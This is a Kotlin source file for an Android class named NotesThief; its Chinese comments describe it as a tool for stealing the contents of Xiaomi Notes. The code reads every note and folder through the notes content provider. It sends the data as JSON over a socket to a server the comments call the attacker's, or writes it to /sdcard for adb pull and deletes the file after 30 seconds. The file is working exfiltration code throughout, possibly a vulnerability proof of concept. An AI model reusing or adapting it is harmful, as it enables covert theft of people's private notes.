package xyz.mufanc.vap.util

import android.content.ContentResolver
import android.database.Cursor
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedOutputStream
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * 小米笔记窃取工具
 * 类似于 Recorder，用于窃取小米笔记的内容
 */
class NotesThief {

    companion object {
        private const val TAG = "NotesThief"

        // 小米笔记的 Content Provider URI
        // authority "notes" 为实际可访问路径（"com.miui.notes" 返回空）
        private const val NOTES_AUTHORITY = "notes"
        private val NOTES_URI = Uri.parse("content://$NOTES_AUTHORITY/note")

        // 笔记数据库字段（通过 adb shell 实际探查确认）
        private const val COLUMN_ID = "_id"
        private const val COLUMN_TITLE = "title"           // 实际字段名
        private const val COLUMN_SNIPPET = "snippet"       // 摘要
        private const val COLUMN_CONTENT = "plain_text"    // 正文纯文本
        private const val COLUMN_CREATED_DATE = "created_date"
        private const val COLUMN_MODIFIED_DATE = "modified_date"
        private const val COLUMN_TYPE = "type"
        private const val COLUMN_FOLDER_ID = "parent_id"
        private const val COLUMN_DELETION_TAG = "deletion_tag"
    }

    /**
     * 窃取所有笔记并保存到设备本地文件（供 adb pull 拉取）
     *
     * @param outputPath 设备上的输出文件路径，默认 /sdcard/notes_stolen.json
     * @return 成功窃取的笔记数量
     */
    fun stealNotesToFile(outputPath: String = "/sdcard/notes_stolen.json"): Int {
        Log.i(TAG, "Starting notes theft to file: $outputPath")

        var stolenCount = 0

        try {
            val contentResolver = Ctx.app.contentResolver
            val notes = queryAllNotes(contentResolver)
            Log.i(TAG, "Found ${notes.length()} notes")

            if (notes.length() == 0) {
                Log.w(TAG, "No notes found")
                // 写空数组到文件，方便调试
                java.io.File(outputPath).writeText("[]", Charsets.UTF_8)
                return 0
            }

            java.io.File(outputPath).writeText(notes.toString(), Charsets.UTF_8)
            stolenCount = notes.length()
            Log.i(TAG, "Successfully wrote $stolenCount notes to $outputPath")

            // 30 秒后自动删除设备上的临时文件
            Thread {
                Thread.sleep(30_000)
                try {
                    val f = java.io.File(outputPath)
                    if (f.exists()) {
                        f.delete()
                        Log.i(TAG, "Auto-deleted temp file: $outputPath")
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to auto-delete temp file: ${e.message}")
                }
            }.start()

            return stolenCount
        } catch (e: Exception) {
            Log.e(TAG, "Failed to steal notes to file", e)
        }

        return stolenCount
    }

        /**
         * 列出文件夹并保存到设备本地文件
         */
        fun listFoldersToFile(outputPath: String = "/sdcard/notes_folders.json"): Int {
            Log.i(TAG, "Listing folders to file: $outputPath")

            return try {
                val folders = listFolders()
                java.io.File(outputPath).writeText(folders.toString(), Charsets.UTF_8)
                Log.i(TAG, "Wrote ${folders.length()} folders to $outputPath")

                // 30 秒后自动删除设备上的临时文件
                Thread {
                    Thread.sleep(30_000)
                    try {
                        val f = java.io.File(outputPath)
                        if (f.exists()) {
                            f.delete()
                            Log.i(TAG, "Auto-deleted temp file: $outputPath")
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to auto-delete temp file: ${e.message}")
                    }
                }.start()

                folders.length()
            } catch (e: Exception) {
                Log.e(TAG, "Failed to list folders to file", e)
                0
            }
        }

        /**
         * 窃取所有笔记并发送到服务器
         *
         * @param serverAddress 攻击者服务器地址
         * @param serverPort 攻击者服务器端口
         * @return 成功窃取的笔记数量
         */
        fun stealNotes(serverAddress: String, serverPort: Int): Int {
            Log.i(TAG, "Starting notes theft...")
            Log.i(TAG, "Target server: $serverAddress:$serverPort")

            var stolenCount = 0

            try {
                val contentResolver = Ctx.app.contentResolver

                // 查询所有笔记
                val notes = queryAllNotes(contentResolver)
                Log.i(TAG, "Found ${notes.length()} notes")

                if (notes.length() == 0) {
                    Log.w(TAG, "No notes found")
                    return 0
                }

                // 连接到攻击者服务器
                Log.i(TAG, "Attempting to connect to $serverAddress:$serverPort...")
                val socket = Socket(serverAddress, serverPort)
                Log.i(TAG, "Socket connected successfully!")
                
                val outputStream = BufferedOutputStream(socket.getOutputStream())
                Log.i(TAG, "Got output stream, sending ${notes.length()} notes...")

                // 发送笔记数据（JSON 格式）
                val jsonData = notes.toString().toByteArray(Charsets.UTF_8)
                Log.i(TAG, "JSON data size: ${jsonData.size} bytes")
                outputStream.write(jsonData)
                outputStream.flush()
                Log.i(TAG, "Data flushed to socket")

                // 显式关闭写端，告诉对端数据发完了
                socket.shutdownOutput()
                Log.i(TAG, "Socket write end shutdown")
                
                // 给 adb reverse 转发一点时间
                Thread.sleep(100)

                stolenCount = notes.length()

                outputStream.close()
                socket.close()
                Log.i(TAG, "Socket closed successfully")

                Log.i(TAG, "Successfully stole $stolenCount notes")

            } catch (e: SecurityException) {
                Log.e(TAG, "Permission denied: ${e.message}", e)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to steal notes: ${e.message}", e)
            }

            return stolenCount
        }

        /**
         * 查询所有笔记
         */
        private fun queryAllNotes(contentResolver: ContentResolver): JSONArray {
            val notesArray = JSONArray()
            var cursor: Cursor? = null

            try {
                // 查询笔记
                cursor = contentResolver.query(
                    NOTES_URI,
                    null,  // 查询所有列
                    "$COLUMN_DELETION_TAG = 0 AND $COLUMN_TYPE != 2",  // 过滤已删除和系统文件夹行
                    null,
                    "$COLUMN_MODIFIED_DATE DESC"  // 按修改时间降序排列
                )

                if (cursor == null) {
                    Log.w(TAG, "Query returned null cursor")
                    return notesArray
                }

                Log.d(TAG, "Cursor columns: ${cursor.columnNames.joinToString(", ")}")

                while (cursor.moveToNext()) {
                    try {
                        val note = extractNoteFromCursor(cursor)
                        notesArray.put(note)

                        Log.d(TAG, "Extracted note: ${note.optString("title", "Untitled")}")
                    } catch (e: Exception) {
                        Log.e(TAG, "Failed to extract note at position ${cursor.position}", e)
                    }
                }

            } catch (e: SecurityException) {
                Log.e(TAG, "Permission denied when querying notes", e)
            } catch (e: Exception) {
                Log.e(TAG, "Error querying notes", e)
            } finally {
                cursor?.close()
            }

            return notesArray
        }

        /**
         * 从 Cursor 中提取笔记数据
         */
        private fun extractNoteFromCursor(cursor: Cursor): JSONObject {
            val note = JSONObject()

            try {
                // 提取所有可用字段
                for (columnName in cursor.columnNames) {
                    val columnIndex = cursor.getColumnIndex(columnName)
                    if (columnIndex == -1) continue

                    when (cursor.getType(columnIndex)) {
                        Cursor.FIELD_TYPE_NULL -> {
                            note.put(columnName, JSONObject.NULL)
                        }

                        Cursor.FIELD_TYPE_INTEGER -> {
                            val value = cursor.getLong(columnIndex)
                            note.put(columnName, value)

                            // 如果是时间戳，添加可读格式
                            if (columnName.contains("date") || columnName.contains("time") ||
                                columnName == "created_date" || columnName == "modified_date"
                            ) {
                                val dateFormat =
                                    SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                                note.put("${columnName}_readable", dateFormat.format(Date(value)))
                            }
                        }

                        Cursor.FIELD_TYPE_FLOAT -> {
                            note.put(columnName, cursor.getDouble(columnIndex))
                        }

                        Cursor.FIELD_TYPE_STRING -> {
                            note.put(columnName, cursor.getString(columnIndex) ?: "")
                        }

                        Cursor.FIELD_TYPE_BLOB -> {
                            // 二进制数据，转换为 Base64
                            val blob = cursor.getBlob(columnIndex)
                            note.put(
                                columnName,
                                android.util.Base64.encodeToString(
                                    blob,
                                    android.util.Base64.DEFAULT
                                )
                            )
                        }
                    }
                }

            } catch (e: Exception) {
                Log.e(TAG, "Error extracting note data", e)
            }

            return note
        }

        /**
         * 查询特定文件夹的笔记
         */
        fun stealNotesFromFolder(folderId: Long, serverAddress: String, serverPort: Int): Int {
            Log.i(TAG, "Stealing notes from folder: $folderId")

            var stolenCount = 0

            try {
                val contentResolver = Ctx.app.contentResolver
                var cursor: Cursor? = null

                try {
                    cursor = contentResolver.query(
                        NOTES_URI,
                        null,
                        "$COLUMN_FOLDER_ID = ? AND $COLUMN_DELETION_TAG = 0",
                        arrayOf(folderId.toString()),
                        "$COLUMN_MODIFIED_DATE DESC"
                    )

                    if (cursor == null) {
                        Log.w(TAG, "Query returned null cursor")
                        return 0
                    }

                    val notesArray = JSONArray()
                    while (cursor.moveToNext()) {
                        val note = extractNoteFromCursor(cursor)
                        notesArray.put(note)
                    }

                    Log.i(TAG, "Found ${notesArray.length()} notes in folder $folderId")

                    if (notesArray.length() > 0) {
                        // 发送到服务器
                        val socket = Socket(serverAddress, serverPort)
                        val outputStream = BufferedOutputStream(socket.getOutputStream())

                        val jsonData = notesArray.toString().toByteArray(Charsets.UTF_8)
                        outputStream.write(jsonData)
                        outputStream.flush()

                        outputStream.close()
                        socket.close()

                        stolenCount = notesArray.length()
                        Log.i(TAG, "Successfully stole $stolenCount notes from folder")
                    }

                } finally {
                    cursor?.close()
                }

            } catch (e: Exception) {
                Log.e(TAG, "Failed to steal notes from folder", e)
            }

            return stolenCount
        }

        /**
         * 窃取特定文件夹的笔记并保存到设备本地文件
         */
        fun stealFolderToFile(folderId: Long, outputPath: String): Int {
            Log.i(TAG, "Stealing notes from folder $folderId to file: $outputPath")
            var stolenCount = 0
            try {
                val contentResolver = Ctx.app.contentResolver
                var cursor: Cursor? = null
                try {
                    cursor = contentResolver.query(
                        NOTES_URI,
                        null,
                        "$COLUMN_FOLDER_ID = ? AND $COLUMN_DELETION_TAG = 0",
                        arrayOf(folderId.toString()),
                        "$COLUMN_MODIFIED_DATE DESC"
                    )
                    if (cursor == null) {
                        Log.w(TAG, "Query returned null cursor")
                        java.io.File(outputPath).writeText("[]", Charsets.UTF_8)
                        return 0
                    }
                    val notesArray = JSONArray()
                    while (cursor.moveToNext()) {
                        notesArray.put(extractNoteFromCursor(cursor))
                    }
                    Log.i(TAG, "Found ${notesArray.length()} notes in folder $folderId")
                    java.io.File(outputPath).writeText(notesArray.toString(), Charsets.UTF_8)
                    stolenCount = notesArray.length()
                    Log.i(TAG, "Successfully wrote $stolenCount notes from folder to $outputPath")
                    Thread {
                        Thread.sleep(30_000)
                        try {
                            val f = java.io.File(outputPath)
                            if (f.exists()) { f.delete(); Log.i(TAG, "Auto-deleted: $outputPath") }
                        } catch (e: Exception) { Log.w(TAG, "Failed to auto-delete: ${e.message}") }
                    }.start()
                } finally {
                    cursor?.close()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to steal notes from folder to file", e)
            }
            return stolenCount
        }

        /**
         * 获取所有文件夹列表
         * 小米笔记中文件夹以 type=2 的 note 行存储，直接查询 NOTES_URI 过滤 type=2
         * content://notes/folder 路径不存在，content://com.miui.notes/folder 同样不存在
         */
        fun listFolders(): JSONArray {
            val foldersArray = JSONArray()

            try {
                val contentResolver = Ctx.app.contentResolver

                var cursor: Cursor? = null
                try {
                    // 文件夹是 type=2 的行，直接从 note 表过滤
                    cursor = contentResolver.query(
                        NOTES_URI,
                        arrayOf(
                            COLUMN_ID,
                            COLUMN_TITLE,
                            COLUMN_SNIPPET,
                            "notes_count",
                            COLUMN_MODIFIED_DATE
                        ),
                        "$COLUMN_TYPE = 2 AND $COLUMN_DELETION_TAG = 0",
                        null,
                        null
                    )

                    if (cursor != null) {
                        while (cursor.moveToNext()) {
                            val folder = JSONObject()
                            for (columnName in cursor.columnNames) {
                                val columnIndex = cursor.getColumnIndex(columnName)
                                if (columnIndex == -1) continue
                                when (cursor.getType(columnIndex)) {
                                    Cursor.FIELD_TYPE_INTEGER -> folder.put(
                                        columnName,
                                        cursor.getLong(columnIndex)
                                    )

                                    Cursor.FIELD_TYPE_STRING -> folder.put(
                                        columnName,
                                        cursor.getString(columnIndex) ?: ""
                                    )

                                    else -> {}
                                }
                            }
                            foldersArray.put(folder)
                        }

                        Log.i(TAG, "Found ${foldersArray.length()} folders")
                    } else {
                        Log.w(TAG, "Folder query returned null cursor")
                    }
                } finally {
                    cursor?.close()
                }

            } catch (e: Exception) {
                Log.e(TAG, "Failed to list folders", e)
            }

            return foldersArray
        }
    }



